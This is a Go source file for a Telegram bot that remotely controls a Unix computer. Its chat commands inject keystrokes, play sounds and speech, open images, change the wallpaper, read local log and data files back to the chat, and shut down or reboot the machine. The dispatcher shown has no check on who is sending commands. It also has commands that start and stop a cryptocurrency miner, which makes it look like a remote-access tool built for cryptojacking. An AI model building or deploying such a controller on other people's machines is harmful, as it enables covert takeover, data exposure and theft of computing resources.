package head_com

import (
	"fmt"
	"head/head_com/config_func"
	"head/head_com/func_unix"
	"head/head_com/shell"
	"head/head_com/updata"
	"os"
	"strconv"
	"strings"

	tgbotapi "github.com/go-telegram-bot-api/telegram-bot-api/v5"
)

type VolumeRequest struct {
	Volume float64 `json:"volume"`
}

func Read_file(filename string) (string, error) {
	data, err := os.ReadFile(filename)
	if err != nil {
		return "", fmt.Errorf("error %s: %v", filename, err)
	}
	return string(data), nil
}

var let_start = 0

func Check_msg_user(bot *tgbotapi.BotAPI, chatID int64, message *tgbotapi.Message) int {
	msg := message.Text

	if msg == "#bot1" {
		let_start = 1
		bot.Send(tgbotapi.NewMessage(chatID, "set_1 unix"))
		return 1
	} else if msg == "#bot0" {
		let_start = 0
		bot.Send(tgbotapi.NewMessage(chatID, "set0 unix"))
		return 1
	} else if let_start == 1 {
		return 1
	} else if msg == "#help" {
		text, _ := Read_file("data/help.unix")

		bot.Send(tgbotapi.NewMessage(chatID, text))
		return 1
	} else if msg == "/start" {
		bot.Send(tgbotapi.NewMessage(chatID, "viva 213452!"))
		return 1
	} else if msg == "#off" {
		bot.Send(tgbotapi.NewMessage(chatID, "bot off"))
		os.Exit(0)

		return 1
	} else if strings.HasPrefix(msg, "#sound") {
		parts := strings.Fields(msg)
		if len(parts) == 2 {
			volume, err := strconv.ParseFloat(parts[1], 64)
			if err != nil || volume < 0 || volume > 100 {
				bot.Send(tgbotapi.NewMessage(chatID, "diapazon (0-100)."))
				return 1
			}

			func_unix.Sound(volume)

			bot.Send(tgbotapi.NewMessage(chatID, "change sound "+strconv.FormatFloat(volume, 'f', 0, 64)+"%"))
		} else {
			bot.Send(tgbotapi.NewMessage(chatID, "format command #sound <value> (0-100)."))
		}
		return 1
	} else if strings.HasPrefix(msg, "#mouse") {
		parts := strings.Fields(msg)
		if len(parts) == 2 {
			volume, err := strconv.ParseFloat(parts[1], 64)
			if err != nil || volume < 0 || volume > 100 {
				bot.Send(tgbotapi.NewMessage(chatID, "diapazon (0-100)."))
				return 1
			}

			func_unix.Mouse(volume)

			bot.Send(tgbotapi.NewMessage(chatID, "change mouse "+strconv.FormatFloat(volume, 'f', 0, 64)+"%"))
		} else {
			bot.Send(tgbotapi.NewMessage(chatID, "format command #mouse <value> (0-100)."))
		}
		return 1
	} else if strings.HasPrefix(msg, "#music") {
		parts := strings.Fields(msg)
		volume, err := strconv.ParseFloat(parts[1], 64)
		if err != nil || volume < 0 || volume > 100 {
			bot.Send(tgbotapi.NewMessage(chatID, "diapazon (0-100)."))
			return 0
		}

		go func_unix.Start_music(int(volume), chatID, bot)

		bot.Send(tgbotapi.NewMessage(chatID, "start music"))
		return 1
	} else if msg == "#sleep" {
		func_unix.Sleep_pc()
		bot.Send(tgbotapi.NewMessage(chatID, "sleep"))
		return 1
	} else if msg == "#shutdown" {
		func_unix.Shutdown_pc()
		bot.Send(tgbotapi.NewMessage(chatID, "Shutdown"))
		return 1
	} else if msg == "#reboot" {
		func_unix.Reboot_pc()
		bot.Send(tgbotapi.NewMessage(chatID, "reboot"))
		return 1
	} else if strings.HasPrefix(msg, "#key") {
		parts := strings.Fields(msg)
		text := strings.Join(parts[1:], " ")

		func_unix.Key_unix(text)

		bot.Send(tgbotapi.NewMessage(chatID, "start key"))
		return 1
	} else if strings.HasPrefix(msg, "#text") {
		parts := strings.Fields(msg)

		if len(parts) > 1 {
			text := strings.Join(parts[1:], " ")

			func_unix.Speench_text(text, chatID, bot)

			bot.Send(tgbotapi.NewMessage(chatID, "start speech "+text))

			return 1
		} else {
			bot.Send(tgbotapi.NewMessage(chatID, "de text?"))
			return 1
		}
	} else if strings.HasPrefix(msg, "#foto") {
		parts := strings.Fields(msg)
		volume, _ := strconv.ParseFloat(parts[1], 64)

		func_unix.Open_foto(int(volume), chatID, bot)

		bot.Send(tgbotapi.NewMessage(chatID, "start foto"))
		return 1
	} else if msg == "#sminer" {
		if err := func_unix.StartMining(); err != nil {
			bot.Send(tgbotapi.NewMessage(chatID, "Error starting miner: "+err.Error()))
		} else {
			bot.Send(tgbotapi.NewMessage(chatID, "Miner started"))
		}
		return 1
	} else if msg == "#pminer" {
		func_unix.StopMining()
		bot.Send(tgbotapi.NewMessage(chatID, "Miner stopped"))
		return 1
	} else if msg == "#close" {
		func_unix.Close_window()
		bot.Send(tgbotapi.NewMessage(chatID, "close"))
		return 1
	} else if strings.HasPrefix(message.Caption, "#up_foto") {
		if len(message.Photo) == 0 {
			bot.Send(tgbotapi.NewMessage(message.Chat.ID, "error none foto"))
			return 0
		}

		val := updata.Up_foto(bot, message)

		if val == 1 {
			bot.Send(tgbotapi.NewMessage(message.Chat.ID, "up foto"))
			return 1
		} else {
			bot.Send(tgbotapi.NewMessage(message.Chat.ID, "error"))
			return 0
		}
	} else if strings.HasPrefix(message.Caption, "#up_music") {
		if message.Audio == nil {
			bot.Send(tgbotapi.NewMessage(message.Chat.ID, "error none music"))
			return 0
		}

		val := updata.Up_music(bot, message)

		if val == 1 {
			bot.Send(tgbotapi.NewMessage(message.Chat.ID, "up music"))
			return 1
		} else {
			bot.Send(tgbotapi.NewMessage(message.Chat.ID, "error"))
			return 0
		}
	} else if msg == "#data_foto" {
		text, _ := Read_file("data/foto.json")

		bot.Send(tgbotapi.NewMessage(chatID, text))
		return 1
	} else if msg == "#data_music" {
		text, _ := Read_file("data/music.json")

		bot.Send(tgbotapi.NewMessage(chatID, text))
		return 1
	} else if msg == "#data_log" {
		text, _ := Read_file("data/log.txt")

		bot.Send(tgbotapi.NewMessage(chatID, text))
		return 1
	} else if strings.HasPrefix(message.Caption, "#bg") {
		func_unix.Bg_window(bot, message)

		bot.Send(tgbotapi.NewMessage(chatID, "bg change"))
		return 1
	} else if msg == "#temp" {
		config_func.Del_temp("data_use/temp")

		bot.Send(tgbotapi.NewMessage(chatID, "temp del"))
		return 1
	} else if message.Animation != nil {
		val := shell.Open_gif(bot, message)

		if val == 1 {
			bot.Send(tgbotapi.NewMessage(message.Chat.ID, "start gif"))
			return 1
		} else {
			bot.Send(tgbotapi.NewMessage(message.Chat.ID, "error"))
			return 0
		}
	}

	return 0
}
